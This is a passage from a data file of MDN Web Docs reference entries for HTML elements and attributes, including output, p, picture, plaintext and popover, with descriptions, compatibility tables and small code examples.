[`<meter>`](meter).\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/option](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/option)"
- name: output
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<output\\>: The Output element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since October 2018.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Foutput&level=high)\n\nThe `<output>` [HTML](../index) element is a container element into which a site or app can inject the results of a calculation or the outcome of a user action.\n\n## Attributes\n\nThis element includes the [global attributes](../global_attributes).\n\n[`for`](../attributes/for)  \nA space-separated list of other elements' [`id`](../global_attributes#id)s, indicating that those elements contributed input values to (or otherwise affected) the calculation.\n\n[`form`](#form)  \nThe [`<form>`](form) element to associate the output with (its *form owner*). The value of this attribute must be the [`id`](../global_attributes#id) of a `<form>` in the same document. (If this attribute is not set, the `<output>` is associated with its ancestor `<form>` element, if any.)\n\nThis attribute lets you associate `<output>` elements to `<form>`s anywhere in the document, not just inside a `<form>`. It can also override an ancestor `<form>` element.\n\n[`name`](#name)  \nThe element's name. Used in the [`form.elements`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLFormElement/elements) API.\n\nThe `<output>` value, name, and contents are NOT submitted during form submission.\n\n## Accessibility\n\nMany browsers implement this element as an [`aria-live`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/ARIA_Live_Regions) region. Assistive technology will thereby announce the results of UI interactions posted inside it without requiring that focus is switched away from the controls that produce those results.\n\n## Examples\n\nIn the following example, the form provides a slider whose value can range between `0` and `100`, and an [`<input>`](input) element into which you can enter a second number. The two numbers are added together, and the result is displayed in the `<output>` element each time the value of any of the controls changes.\n\nhtml\n\n```\n<form id=\"example-form\">\n  <input type=\"range\" id=\"b\" name=\"b\" value=\"50\" /> +\n  <input type=\"number\" id=\"a\" name=\"a\" value=\"10\" /> =\n  <output name=\"result\" for=\"a b\">60</output>\n</form>\n```\n\njs\n\n```\nconst form = document.getElementById(\"example-form\");\nconst a = form.elements[\"a\"];\nconst b = form.elements[\"b\"];\nconst result = form.elements[\"result\"];\n\nfunction updateResult() {\n  const aValue = parseInt(a.value);\n  const bValue = parseInt(b.value);\n  result.value = aValue + bValue;\n}\n\nform.addEventListener(\"input\", updateResult);\n\nupdateResult();\n```\n\n### Result\n\n## Technical summary\n\n|                                             |                                                                                                                                                                                                                                                                                                                                                                 |\n|---------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [phrasing content](../content_categories#phrasing_content), [listed](../content_categories#form_listed), [labelable](../content_categories#form_labelable), [resettable](../content_categories#form_resettable) [form-associated element](../content_categories#form-associated_content), palpable content. |\n| Permitted content                           | [Phrasing content](../content_categories#phrasing_content).                                                                                                                                                                                                                                                                                                     |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                                                                                                                                                                                                                                                           |\n| Permitted parents                           | Any element that accepts [phrasing content](../content_categories#phrasing_content).                                                                                                                                                                                                                                                                            |\n| Implicit ARIA role                          | [`status`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/status_role)                                                                                                                                                                                                                                                                   |\n| Permitted ARIA roles                        | Any                                                                                                                                                                                                                                                                                                                                                             |\n| DOM interface                               | [`HTMLOutputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLOutputElement)                                                                                                                                                                                                                                                                       |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|          | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|----------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|          | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `output` | 10      | ≤18  | 4       | 11    | 7      | 18             | 4                   | 11            | 7             | 1.0              | 4.4             |     |\n| `for`    | 10      | ≤18  | 4       | 11    | 7      | 18             | 4                   | 11            | 7             | 1.0              | 4.4             |     |\n| `form`   | 10      | ≤18  | 4       | 11    | 7      | 18             | 4                   | 11            | 7             | 1.0              | 4.4             |     |\n| `name`   | 10      | ≤18  | 4       | 11    | 7      | 18             | 4                   | 11            | 7             | 1.0              | 4.4             |     |\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/output](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/output)"
- name: p
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<p\\>: The Paragraph element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fp&level=high)\n\nThe `<p>` [HTML](../index) element represents a paragraph. Paragraphs are usually represented in visual media as blocks of text separated from adjacent blocks by blank lines and/or first-line indentation, but HTML paragraphs can be any structural grouping of related content, such as images or form fields.\n\nParagraphs are [block-level elements](https://developer.mozilla.org/en-US/docs/Glossary/Block-level_content), and notably will automatically close if another block-level element is parsed before the closing `</p>` tag. See \"Tag omission\" below.\n\n## Try it\n\n#### HTML Demo: \\<p\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <p>\n      Geckos are a group of usually small, usually nocturnal lizards. They are found on every continent except Antarctica.\n    </p>\n\n    <p>Some species live in houses where they hunt insects attracted by artificial light.</p>\n\n    p {\n      margin: 10px 0;\n      padding: 5px;\n      border: 1px solid #999;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element only includes the [global attributes](../global_attributes).\n\n**Note:** The `align` attribute on `<p>` tags is obsolete and shouldn't be used.\n\n## Accessibility\n\nBreaking up content into paragraphs helps make a page more accessible. Screen-readers and other assistive technology provide shortcuts to let their users skip to the next or previous paragraph, letting them skim content like how white space lets visual users skip around.\n\nUsing empty `<p>` elements to add space between paragraphs is problematic for people who navigate with screen-reading technology. Screen readers may announce the paragraph's presence, but not any content contained within it — because there is none. This can confuse and frustrate the person using the screen reader.\n\nIf extra space is desired, use [CSS](https://developer.mozilla.org/en-US/docs/Glossary/CSS) properties like [`margin`](https://developer.mozilla.org/en-US/docs/Web/CSS/margin) to create the effect:\n\ncss\n\n```\np {\n  margin-bottom: 2em; /* increase white space after a paragraph */\n}\n```\n\n## Examples\n\n### HTML\n\nhtml\n\n```\n<p>\n  This is the first paragraph of text. This is the first paragraph of text. This\n  is the first paragraph of text. This is the first paragraph of text.\n</p>\n<p>\n  This is the second paragraph. This is the second paragraph. This is the second\n  paragraph. This is the second paragraph.\n</p>\n```\n\n### Result\n\n## Styling paragraphs\n\nBy default, browsers separate paragraphs with a single blank line. Alternate separation methods, such as first-line indentation, can be achieved with [CSS](https://developer.mozilla.org/en-US/docs/Glossary/CSS):\n\n### HTML\n\nhtml\n\n```\n<p>\n  Separating paragraphs with blank lines is easiest for readers to scan, but\n  they can also be separated by indenting their first lines. This is often used\n  to take up less space, such as to save paper in print.\n</p>\n\n<p>\n  Writing that is intended to be edited, such as school papers and rough drafts,\n  uses both blank lines and indentation for separation. In finished works,\n  combining both is considered redundant and amateurish.\n</p>\n\n<p>\n  In very old writing, paragraphs were separated with a special character: ¶,\n  the <i>pilcrow</i>. Nowadays, this is considered claustrophobic and hard to\n  read.\n</p>\n\n<p>\n  How hard to read? See for yourself:\n  <button data-toggle-text=\"Oh no! Switch back!\">\n    Use pilcrow for paragraphs\n  </button>\n</p>\n```\n\n### CSS\n\ncss\n\n```\np {\n  margin: 0;\n  text-indent: 3ch;\n}\n\np.pilcrow {\n  text-indent: 0;\n  display: inline;\n}\np.pilcrow + p.pilcrow::before {\n  content: \" ¶ \";\n}\n```\n\n### JavaScript\n\njs\n\n```\ndocument.querySelector(\"button\").addEventListener(\"click\", (event) => {\n  document.querySelectorAll(\"p\").forEach((paragraph) => {\n    paragraph.classList.toggle(\"pilcrow\");\n  });\n\n  [event.target.innerText, event.target.dataset.toggleText] = [\n    event.target.dataset.toggleText,\n    event.target.innerText,\n  ];\n});\n```\n\n### Result\n\n## Technical summary\n\n|                                             |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |\n|---------------------------------------------||\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), palpable content|\n| Permitted content                           | [Phrasing content](../content_categories#phrasing_content|\n| Tag omission                                | The start tag is required. The end tag may be omitted if the `<p>` element is immediately followed by an [`<address>`](address), [`<article>`](article), [`<aside>`](aside), [`<blockquote>`](blockquote), [`<details>`](details), [`<div>`](div), [`<dl>`](dl), [`<fieldset>`](fieldset), [`<figcaption>`](figcaption), [`<figure>`](figure), [`<footer>`](footer), [`<form>`](form), [h1](heading_elements), [h2](heading_elements), [h3](heading_elements), [h4](heading_elements), [h5](heading_elements), [h6](heading_elements), [`<header>`](header), [`<hgroup>`](hgroup), [`<hr>`](hr), [`<main>`](main), [`<menu>`](menu), [`<nav>`](nav), [`<ol>`](ol), [`<pre>`](pre), [`<search>`](search), [`<section>`](section), [`<table>`](table), [`<ul>`](ul) or another `<p>` element, or if there is no more content in the parent element and the parent element is not an [`<a>`](a), [`<audio>`](audio), [`<del>`](del), [`<ins>`](ins), [`<map>`](map), [`<noscript>`](noscript) or [`<video>`](video) element, or an autonomous custom element. |\n| Permitted parents                           | Any element that accepts [flow content](../content_categories#flow_content|\n| Implicit ARIA role                          | [paragraph](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/structural_roles|\n| Permitted ARIA roles                        | Any|\n| DOM interface                               | [`HTMLParagraphElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLParagraphElement|\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|     | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-----|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|     | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `p` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n## See also\n\n- [`<hr>`](hr)\n- [`<br>`](br)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/p](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/p)"
- name: param
  summary: 'Deprecated: This feature is no longer recommended'
  description: "# \\<param\\>: The Object Parameter element\n\n**Deprecated:** This feature is no longer recommended. Though some browsers might still support it, it may have already been removed from the relevant web standards, may be in the process of being dropped, or may only be kept for compatibility purposes. Avoid using it, and update existing code if possible; see the [compatibility table](#browser_compatibility) at the bottom of this page to guide your decision. Be aware that this feature may cease to work at any time.\n\nThe `<param>` [HTML](../index) element defines parameters for an [`<object>`](object) element.\n\n**Note:** Use the [`<object>`](object) element with a [`data`](object#data) attribute to set the URL of an external resource.\n\n## Attributes\n\nThis element includes the [global attributes](../global_attributes).\n\n[`name`](#name) Deprecated  \nName of the parameter.\n\n[`value`](#value) Deprecated  \nSpecifies the value of the parameter.\n\n[`type`](#type) Deprecated  \nOnly used if the `valuetype` is set to `ref`. Specifies the MIME type of values found at the URI specified by value.\n\n[`valuetype`](#valuetype) Deprecated  \nSpecifies the type of the `value` attribute. Possible values are:\n\n- `data`: Default value. The value is passed to the object's implementation as a string.\n- `ref`: The value is a URI to a resource where run-time values are stored.\n- `object`: An ID of another [`<object>`](object) in the same document.\n\n## Technical summary\n\n|                                             |                                                                                               |\n|---------------------------------------------|-----------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | None.                                                                                         |\n| Permitted content                           | None; it is a [void element](https://developer.mozilla.org/en-US/docs/Glossary/Void_element). |\n| Tag omission                                | Must have a start tag and must not have an end tag.                                           |\n| Permitted parents                           | An [`<object>`](object) before any [flow content](../content_categories#flow_content).        |\n| Implicit ARIA role                          | [No corresponding role](https://www.w3.org/TR/html-aria/#dfn-no-corresponding-role)           |\n| Permitted ARIA roles                        | No `role` permitted                                                                           |\n| DOM interface                               | [`HTMLParamElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLParamElement)       |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|             | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|             | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `param`     | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n| `name`      | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n| `type`      | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n| `value`     | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n| `valuetype` | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n\n## See also\n\n- [`<object>`](object)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/param](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/param)"
- name: part (attribute)
  summary: The part global attribute contains a space-separated list of the part names of the element
  description: "# part\n\nThe `part` [global attribute](../global_attributes) contains a space-separated list of the part names of the element. Part names allows CSS to select and style specific elements in a shadow tree via the [`::part`](https://developer.mozilla.org/en-US/docs/Web/CSS/::part) pseudo-element.\n\nSee the [`exportparts` attribute](exportparts) for a usage example.\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|        | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|        | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `part` | 73      | 79   | 72      | 60    | 13.1   | 73             | 79                  | 52            | 13.4          | 11.0             | 73              |     |\n\n## See also\n\n- [`exportparts`](exportparts) HTML attribute\n- [`<template>`](../element/template) and [`<slot>`](../element/slot) HTML elements\n- [`::part`](https://developer.mozilla.org/en-US/docs/Web/CSS/::part) and [`::slotted`](https://developer.mozilla.org/en-US/docs/Web/CSS/::slotted) CSS pseudo-elements\n- [`ShadowRoot`](https://developer.mozilla.org/en-US/docs/Web/API/ShadowRoot) interface\n- [`Element.part`](https://developer.mozilla.org/en-US/docs/Web/API/Element/part) property\n- [Using templates and slots](https://developer.mozilla.org/en-US/docs/Web/API/Web_components/Using_templates_and_slots)\n- [CSS scoping](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_scoping) module\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/part](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/part)"
- name: pattern (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`pattern`](attributes/pattern)

    [`<input>`](element/input)

    Defines a regular expression which the element's value will be validated against.
- name: picture
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<picture\\>: The Picture element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since March 2016.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fpicture&level=high)\n\nThe `<picture>` [HTML](../index) element contains zero or more [`<source>`](source) elements and one [`<img>`](img) element to offer alternative versions of an image for different display/device scenarios.\n\nThe browser will consider each child `<source>` element and choose the best match among them. If no matches are found—or the browser doesn't support the `<picture>` element—the URL of the `<img>` element's [`src`](img#src) attribute is selected. The selected image is then presented in the space occupied by the `<img>` element.\n\n## Try it\n\n#### HTML Demo: \\<picture\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <!--Change the browser window width to see the image change.-->\n\n    <picture>\n      <source srcset=\"/media/cc0-images/surfer-240-200.jpg\" media=\"(orientation: portrait)\" />\n      <img src=\"/media/cc0-images/painted-hand-298-332.jpg\" alt=\"\" />\n    </picture>\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\nTo decide which URL to load, the [user agent](https://developer.mozilla.org/en-US/docs/Glossary/User_agent) examines each `<source>`'s [`srcset`](source#srcset), [`media`](source#media), and [`type`](source#type) attributes to select a compatible image that best matches the current layout and capabilities of the display device.\n\nThe `<img>` element serves two purposes:\n\n1.  It describes the size and other attributes of the image and its presentation.\n2.  It provides a fallback in case none of the offered `<source>` elements are able to provide a usable image.\n\nCommon use cases for `<picture>`:\n\n- **Art direction.** Cropping or modifying images for different `media` conditions (for example, loading a simpler version of an image which has too many details, on smaller displays).\n- **Offering alternative image formats**, for cases where certain formats are not supported.\n  **Note:** For example, newer formats like [AVIF](https://developer.mozilla.org/en-US/docs/Web/Media/Formats/Image_types#avif_image) or [WEBP](https://developer.mozilla.org/en-US/docs/Web/Media/Formats/Image_types#webp_image) have many advantages, but might not be supported by the browser. A list of supported image formats can be found in: [Image file type and format guide](https://developer.mozilla.org/en-US/docs/Web/Media/Formats/Image_types).\n- **Saving bandwidth and speeding page load times** by loading the most appropriate image for the viewer's display.\n\nIf providing higher-density versions of an image for high-DPI (Retina) display, use [`srcset`](img#srcset) on the `<img>` element instead. This lets browsers opt for lower-density versions in data-saving modes, and you don't have to write explicit `media` conditions.\n\n## Attributes\n\nThis element includes only [global attributes](../global_attributes).\n\n## Usage notes\n\nYou can use the [`object-position`](https://developer.mozilla.org/en-US/docs/Web/CSS/object-position) property to adjust the positioning of the image within the element's frame, and the [`object-fit`](https://developer.mozilla.org/en-US/docs/Web/CSS/object-fit) property to control how the image is resized to fit within the frame.\n\n**Note:** Use these properties on the child `<img>` element, **not** the `<picture>` element.\n\n## Examples\n\nThese examples demonstrate how different attributes of the [`<source>`](source) element change the selection of the image inside `<picture>`.\n\n### The media attribute\n\nThe `media` attribute specifies a media condition (similar to a media query) that the user agent will evaluate for each [`<source>`](source) element.\n\nIf the [`<source>`](source)'s media condition evaluates to `false`, the browser skips it and evaluates the next element inside `<picture>`.\n\nhtml\n\n```\n<picture>\n  <source srcset=\"mdn-logo-wide.png\" media=\"(min-width: 600px)\" />\n  <img src=\"mdn-logo-narrow.png\" alt=\"MDN\" />\n</picture>\n```\n\n### The srcset attribute\n\nThe [srcset](source#srcset) attribute is used to offer a list of possible images based on size or the display's pixel density.\n\nIt is composed of a comma-separated list of image descriptors. Each image descriptor is composed of a URL of the image, and *either*:\n\n- a *width descriptor*, followed by a `w` (such as `300w`); *OR*\n- a *pixel density descriptor*, followed by an `x` (such as `2x`) to serve a high-res image for high-DPI screens.\n\nMake sure to note that:\n\n- width and pixel density descriptors should not be used together\n- a missing pixel density descriptor implies 1x\n- duplicate descriptor values are not allowed (2x & 2x, 100w & 100w)\n\nThe following example illustrates the usage of `srcset` attribute with the `<source>` element to specify a high-density and standard-resolution image:\n\nhtml\n\n```\n<picture>\n  <source srcset=\"logo.png, logo-1.5x.png 1.5x\" />\n  <img src=\"logo.png\" alt=\"MDN Web Docs logo\" height=\"320\" width=\"320\" />\n</picture>\n```\n\nThe `srcset` attribute can also be used on the `<img>` element without needing the `<picture>` element. The following example demonstrates how to use the `srcset` attribute to specify standard-resolution and high-density images, respectively:\n\nhtml\n\n```\n<img\n  srcset=\"logo.png, logo-2x.png 2x\"\n  src=\"logo.png\"\n  height=\"320\"\n  width=\"320\"\n  alt=\"MDN Web Docs logo\" />\n```\n\nThe `sizes` attribute is not mandatory when using srcset, but it is recommended to use it in order to provide additional information to the browser to help it select the best image source.\n\nWithout sizes, the browser will use the default size of the image as specified by its dimensions in pixels. This may not be the best fit for all devices, especially if the image is displayed on different screen sizes or in different contexts.\n\nPlease note that sizes will have its effect only if width dimension descriptors are provided with srcset instead of pixel ratio values (200w instead of 2x for example). For more information on using `srcset`, see the [Responsive images](https://developer.mozilla.org/en-US/docs/Learn/HTML/Multimedia_and_embedding/Responsive_images) documentation.\n\n### The type attribute\n\nThe `type` attribute specifies a [MIME type](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types) for the resource URL(s) in the [`<source>`](source) element's `srcset` attribute. If the user agent does not support the given type, the [`<source>`](source) element is skipped.\n\nhtml\n\n```\n<picture>\n  <source srcset=\"photo.avif\" type=\"image/avif\" />\n  <source srcset=\"photo.webp\" type=\"image/webp\" />\n  <img src=\"photo.jpg\" alt=\"photo\" />\n</picture>\n```\n\n## Technical summary\n\n|                                             |                                                                                                                                            |\n|---------------------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), phrasing content, embedded content                                                     |\n| Permitted content                           | Zero or more [`<source>`](source) elements, followed by one [`<img>`](img) element, optionally intermixed with script-supporting elements. |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                                      |\n| Permitted parents                           | Any element that allows embedded content.                                                                                                  |\n| Implicit ARIA role                          | [No corresponding role](https://www.w3.org/TR/html-aria/#dfn-no-corresponding-role)                                                        |\n| Permitted ARIA roles                        | No `role` permitted                                                                                                                        |\n| DOM interface                               | [`HTMLPictureElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLPictureElement)                                                |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|           | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-----------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|           | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `picture` | 38      | 13   | 38      | 25    | 9.1    | 38             | 38                  | 25            | 9.3           | 3.0              | 38              |     |\n\n## See also\n\n- [`<img>`](img) element\n- [`<source>`](source) element\n- Positioning and sizing the picture within its frame: [`object-position`](https://developer.mozilla.org/en-US/docs/Web/CSS/object-position) and [`object-fit`](https://developer.mozilla.org/en-US/docs/Web/CSS/object-fit)\n- [Image file type and format guide](https://developer.mozilla.org/en-US/docs/Web/Media/Formats/Image_types)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/picture](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/picture)"
- name: ping (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`ping`](element/a#ping)

    [`<a>`](element/a), [`<area>`](element/area)

    The `ping` attribute specifies a space-separated list of URLs to be notified if a user follows the hyperlink.
- name: placeholder (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`placeholder`](attributes/placeholder)

    [`<input>`](element/input), [`<textarea>`](element/textarea)

    Provides a hint to the user of what can be entered in the field.
- name: plaintext
  summary: 'Deprecated: This feature is no longer recommended'
  description: "# \\<plaintext\\>: The Plain Text element (Deprecated)\n\n**Deprecated:** This feature is no longer recommended. Though some browsers might still support it, it may have already been removed from the relevant web standards, may be in the process of being dropped, or may only be kept for compatibility purposes. Avoid using it, and update existing code if possible; see the [compatibility table](#browser_compatibility) at the bottom of this page to guide your decision. Be aware that this feature may cease to work at any time.\n\nThe `<plaintext>` [HTML](../index) element renders everything following the start tag as raw text, ignoring any following HTML. There is no closing tag, since everything after it is considered raw text.\n\n**Warning:** Do not use this element.\n\n- `<plaintext>` is deprecated since HTML 2, and not all browsers implemented it. Browsers that did implement it didn't do so consistently.\n- `<plaintext>` is obsolete; browsers that accept it may instead treat it as a [`<pre>`](pre) element that still interprets HTML within.\n- If `<plaintext>` is the first element on the page (other than any non-displayed elements, like [`<head>`](head)), do not use HTML at all. Instead serve a text file with the `text/plain` [MIME-type](https://developer.mozilla.org/en-US/docs/Learn/Server-side/Configuring_server_MIME_types).\n- Instead of `<plaintext>`, use the [`<pre>`](pre) element or, if semantically accurate (such as for inline text), the [`<code>`](code) element. Escape any `<`, `>` and `&` characters, to prevent browsers inadvertently parsing content the element content as HTML.\n- A monospaced font can be applied to any HTML element via a [CSS](https://developer.mozilla.org/en-US/docs/Web/CSS) [`font-family`](https://developer.mozilla.org/en-US/docs/Web/CSS/font-family) style with the `monospace` generic value.\n\n## Attributes\n\nThis element has no other attributes than the [global attributes](../global_attributes) common to all elements.\n\n## DOM interface\n\nThis element implements the [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement) interface.\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- The [`<pre>`](pre) and [`<code>`](code) elements, which should be used instead.\n- The [`<xmp>`](xmp) element, also obsolete, similar to `<plaintext>`.\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/plaintext](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/plaintext)"
- name: playsinline (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`playsinline`](element/video#playsinline)

    [`<video>`](element/video)

    A Boolean attribute indicating that the video is to be played "inline"; that is, within the element's playback area. Note that the absence of this attribute does not imply that the video will always be played in fullscreen.
- name: popover (attribute)
  summary: Since April 2024, this feature works across the latest devices and browser versions
  description: "# popover\n\n## Baseline 2024\n\nNewly available\n\nSince April 2024, this feature works across the latest devices and browser versions. This feature might not work in older devices or browsers.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FGlobal_attributes%2Fpopover&level=low)\n\nThe `popover` [global attribute](../global_attributes) is used to designate an element as a popover element.\n\nPopover elements are hidden via `display: none` until opened via an invoking/control element (i.e. a `<button>` or `<input type=\"button\">` with a [`popovertarget`](../element/button#popovertarget) attribute) or a [`HTMLElement.showPopover()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/showPopover) call.\n\nWhen open, popover elements will appear above all other elements in the [top layer](https://developer.mozilla.org/en-US/docs/Glossary/Top_layer), and won't be influenced by parent elements' [`position`](https://developer.mozilla.org/en-US/docs/Web/CSS/position) or [`overflow`](https://developer.mozilla.org/en-US/docs/Web/CSS/overflow) styling.\n\nA popover attribute can have values [`\"auto\"`](https://developer.mozilla.org/en-US/docs/Web/API/Popover_API/Using#auto_state_and_light_dismiss) (default) or [`\"manual\"`](https://developer.mozilla.org/en-US/docs/Web/API/Popover_API/Using#using_manual_popover_state). Popovers that have the `auto` state can be \"light dismissed\" by selecting outside the popover area, and generally only allow one popover to be displayed on-screen at a time. By contrast, `manual` popovers must always be explicitly hidden, but allow for use cases such as nested popovers in menus.\n\nFor detailed information on usage, see the [Popover API](https://developer.mozilla.org/en-US/docs/Web/API/Popover_API) landing page.\n\n## Examples\n\nThe following renders a button that will open a popover element when activated.\n\nhtml\n\n```\n<button popovertarget=\"my-popover\">Open Popover</button>\n\n<div popover id=\"my-popover\">Greetings, one and all!</div>\n```\n\n**Note:** See our [Popover API examples landing page](https://mdn.github.io/dom-examples/popover-api/) to access the full collection of MDN popover examples.\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|           | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-----------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|           | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `popover` | 114     | 114  | 125     | 100   | 17     | 114            | 125                 | 76            | 17            | 23.0             | 114             |     |\n\n## See also\n\n- [Popover API](https://developer.mozilla.org/en-US/docs/Web/API/Popover_API)\n- [`popovertarget`](../element/button#popovertarget) HTML attribute\n- [`popovertargetaction`](../element/button#popovertargetaction) HTML attribute\n- [`::backdrop`](https://developer.mozilla.org/en-US/docs/Web/CSS/::backdrop) CSS pseudo-element\n- 